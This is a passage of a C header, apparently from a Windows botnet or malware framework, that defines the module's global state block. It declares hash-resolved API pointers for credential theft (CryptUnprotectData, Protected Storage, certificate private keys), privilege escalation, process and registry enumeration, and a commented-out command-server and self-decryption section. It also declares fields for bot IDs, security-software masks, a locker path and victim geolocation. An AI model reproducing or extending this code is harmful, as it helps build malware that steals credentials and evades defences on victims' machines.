    FnWSASetLastError fnWSASetLastError;
    FnGetAddrInfoW fnGetAddrInfoW;
    FnGetNameInfoW fnGetNameInfoW;
    FnWSASocketW fnWSASocketW;
    Fnbind fnbind;
    FnWSARecv fnWSARecv;
    Fngetsockname fngetsockname;
    Fngetpeername fngetpeername;
    FnWSASend fnWSASend;
    Fnlisten fnlisten;
    FnWSADuplicateSocketW fnWSADuplicateSocketW;
    FnWSASendTo fnWSASendTo;
    FnWSARecvFrom fnWSARecvFrom;
    Fnhtonl fnhtonl;
    FnFreeAddrInfoW fnFreeAddrInfoW;

    // iphlpapi.dll
    FnGetAdaptersInfo fnGetAdaptersInfo;
    FnGetAdaptersAddresses fnGetAdaptersAddresses;

    // crypt32.dll
    FnCryptUnprotectData fnCryptUnprotectData;
    FnCertOpenSystemStoreW fnCertOpenSystemStoreW;
    FnCertEnumCertificatesInStore fnCertEnumCertificatesInStore;
    FnCryptAcquireCertificatePrivateKey fnCryptAcquireCertificatePrivateKey;
    FnCertCloseStore fnCertCloseStore;

    // pstorec.dll
    FnPStoreCreateInstance fnPStoreCreateInstance;

    // msi.dll
    FnMsiGetComponentPathW fnMsiGetComponentPathW;

#ifdef FUNCS_CRTDLL
	// crtdll.dll
	Fnatof fnatof;
	Fncos fncos;
	Fnsin fnsin;
	Fnabs fnabs;
#endif // FUNCS_CRTDLL

	// d3d9.dll
	FnDirect3DCreate9 fnDirect3DCreate9;

	// Внутренни функции
	// dyncfuncs.h
	Fndynfuncs_get_module_base_by_hash fndynfuncs_get_module_base_by_hash;
	Fndynfuncs_get_symbol_by_hash fndynfuncs_get_symbol_by_hash;

	// memory.h
	Fnmemory_process_heap fnmemory_process_heap;
	Fnmemory_alloc fnmemory_alloc;
	Fnmemory_realloc fnmemory_realloc;
	Fnmemory_free fnmemory_free;

	// native.h
	Fnnative_create_file_win32 fnnative_create_file_win32;
	Fnnative_delete_file_win32 fnnative_delete_file_win32;
	Fnnative_enum_directory_file fnnative_enum_directory_file;
	Fnnative_open_process fnnative_open_process;
	Fnnative_get_process_path_by_id fnnative_get_process_path_by_id;
	Fnnative_get_process_path fnnative_get_process_path;
	Fnnative_query_token_variable_size fnnative_query_token_variable_size;
	Fnnative_enum_processes fnnative_enum_processes;
	Fnnative_last_status fnnative_last_status;
	Fnnative_zms_to_unicode fnnative_zms_to_unicode;
	Fnnative_initialize_key_object_attributes fnnative_initialize_key_object_attributes;
	Fnnative_open_key fnnative_open_key;
	Fnnative_query_registry_value fnnative_query_registry_value;
	Fnnative_query_registry_string fnnative_query_registry_string;
	Fnnative_complete_query_registry_string fnnative_complete_query_registry_string;
	Fnnative_enumerate_key fnnative_enumerate_key;
	Fnnative_enumerate_key_value fnnative_enumerate_key_value;

	// utils.h
	Fnror fnror;
	Fnrol fnrol;
	Fnutils_strhash fnutils_strhash;
	Fnutils_wcshash fnutils_wcshash;
	Fnutils_wcsihash fnutils_wcsihash;
	Fnutils_create_thread fnutils_create_thread;
	Fnutils_crc32_build_table fnutils_crc32_build_table;
	Fnutils_crc32_update fnutils_crc32_update;
	Fnutils_wcs_random fnutils_wcs_random;
	Fnutils_machine_guid fnutils_machine_guid;

	// logger.h
	Fnlogger_log fnlogger_log;

	// string.h
	Fnzs_new_with_len fnzs_new_with_len;
	Fnzs_new fnzs_new;
	Fnzs_empty fnzs_empty;
	Fnzs_duplicate fnzs_duplicate;
	Fnzs_free fnzs_free;
	Fnzs_length fnzs_length;
	Fnzs_available fnzs_available;
	Fnzs_to_str fnzs_to_str;
	Fnzs_make_room_for fnzs_make_room_for;
	Fnzs_catlen fnzs_catlen;
	Fnzs_cat fnzs_cat;
	Fnzs_update_length fnzs_update_length;
	Fnzs_grow fnzs_grow;
	Fnzs_lastchar fnzs_lastchar;
	Fnzs_catprintf fnzs_catprintf;

	// privilege.h
	Fnprivelege_enable fnprivelege_enable;

	// wmi.h
	Fnwmi_extract_arg fnwmi_extract_arg;
	Fnwmi_get_value fnwmi_get_value;
	Fnwmi_enum_begin fnwmi_enum_begin;
	Fnwmi_enum_next fnwmi_enum_next;
	Fnwmi_get_service fnwmi_get_service;
	Fnwmi_obtain_info fnwmi_obtain_info;

	// vector.h
	Fnvector_new fnvector_new;
	Fnvector_destroy fnvector_destroy;
	Fnvector_clear fnvector_clear;
	Fnvector_size fnvector_size;
	Fnvector_count fnvector_count;
	Fnvector_push_back fnvector_push_back;
	Fnvector_pop_back fnvector_pop_back;
	Fnvector_back fnvector_back;
	Fnvector_access fnvector_access;
	Fnvector_at fnvector_at;
	Fnvector_begin fnvector_begin;
	Fnvector_end fnvector_end;
	Fnvector_data_set fnvector_data_set;
	Fnvector_data_get fnvector_data_get;

	/*
    // Custom global functions
    Fnservercomm_init fnservercomm_init;
    Fnservercomm_done fnservercomm_done;
    Fnservercomm_do_request fnservercomm_do_request;
    Fnservercomm_get_info_request fnservercomm_get_info_request;
    Fnservercomm_check_internet fnservercomm_check_internet;
    Fnarc4_crypt_self fnarc4_crypt_self;

    Fnutils_map_file fnutils_map_file;
    Fnutils_file_write fnutils_file_write;
    Fnutils_file_read fnutils_file_read;
    Fnutils_decrypt_buffer fnutils_decrypt_buffer;

    Fnmemalloc fnmemalloc;
    Fnmemrealloc fnmemrealloc;
    Fnmemfree fnmemfree;

    Fnutils_ansi2wide fnutils_ansi2wide;
    Fnutils_get_symbol_by_hash fnutils_get_symbol_by_hash;
    Fnutils_abs fnutils_abs;
	Fnutils_get_current_unixtime fnutils_get_current_unixtime;
	*/
	ACCESS_MASK processQueryAccess;
	ACCESS_MASK processAllAccess;
	ACCESS_MASK threadQueryAccess;
	ACCESS_MASK threadSetAccess;
	ACCESS_MASK threadAllAccess;

	int allFuncsLoaded;
    int asService;
    int shouldExit;
    uint32_t moduleFlags;
    uint32_t utcStartTime;
    uint32_t utcLastTime;
    LARGE_INTEGER perfFreq;
    LARGE_INTEGER lastFreqStamp;
	HANDLE hDllHandle;
	HANDLE hCommonThread;
    SERVICE_STATUS serviceStatus;
    SERVICE_STATUS_HANDLE serviceStatusHandle;
	//HANDLE hProcessHeap;
	//char mapName[24];
    void* pZfsIo;
	RTL_OSVERSIONINFOEXW versionInfo;
	char* machineGuid;
    char* machineKey;
    wchar_t** subNames;
    uint32_t subNameIndex;
    uint32_t zoneIndex;
    uint8_t* ntdllBase;
    uint8_t* kernel32Base;
    uint8_t installKey[48];
    uint8_t bootKey[48];
    uint8_t fsKey[48];
    uint8_t clientId[16];
    uint8_t botId[64];
    uint32_t buildId;
    uint32_t subId;
    uint32_t securityMask;
    uint64_t hipsMask;
	PSYSTEM_PROCESS_INFORMATION processes; // Список процессов. Память необходимо освобождать после каждой попытки обновить список процессов.
	vector_t softwareDisplayNames;
	vector_t softwareUninstallStrings;
    wchar_t* serviceName;
    wchar_t* serviceBinaryPath;
	wchar_t* systemRoot;
	wchar_t* fsPath;
	wchar_t* rundll32ExportName;
	wchar_t* userAgent;
    int noInternet;
    wchar_t modulePathName[MAX_PATH];
	wchar_t modulePath[MAX_PATH];
	wchar_t* moduleName;
	wchar_t* moduleExt;
    uint8_t* moduleBuffer;
    uint32_t moduleSize;
	wchar_t nullChar[1];
	wchar_t slashString[2];
    wchar_t lockerPathName[MAX_PATH];
	uint32_t crcTable[256];

    async_pipe_t ctrlPipe;

	HANDLE predefineKeyHandles[NATIVE_KEY_MAXIMUM_PREDEFINE];
	UNICODE_STRING predefineKeyNames[NATIVE_KEY_MAXIMUM_PREDEFINE];

    uint32_t elapsedTime; // Время существования бота полученное с сервера (в секундах)
	HANDLE pid;
    char* botIPv4; // IPv4 бота полученный с сервера
    char* botCountry; // Страна.
    char* botCountryCode; // Код страны
    char* botCity; // Город
    char* botRegion; // Штат/регион
    char* botISP; // ISP
    char* botOrg; // Организация
    system_info_t sysInfo;
};

typedef struct _zmodule_block zmodule_block_t;
typedef struct _zmodule_block *pzmodule_block_t;

extern pzmodule_block_t _pZmoduleBlock;

uint64_t zmodule_get_image_base(uint8_t* imageBase);
int zmodule_process_relocs(uint8_t* imageBase, uint64_t delta);

#ifndef _ZMODULE_BUILD
uint8_t* zmodule_load_sections(uint8_t* pOrigImage, uint32_t* pImageSize, uint32_t pageProtect);
uint8_t* zmodule_get_export(uint8_t* moduleBase, uint32_t exportNum, int bRVA);
#endif

//typedef int(__stdcall *FnZModuleEntry)(DWORD reason, void* pBase);
typedef int(__stdcall *FnZModuleEntry)(uint32_t reason, uint8_t* pModuleBase, pzmodule_block_t pZModuleBlock);

#include "dynfuncs.h"

#endif // __ZMODULE_ZMODULE_H_
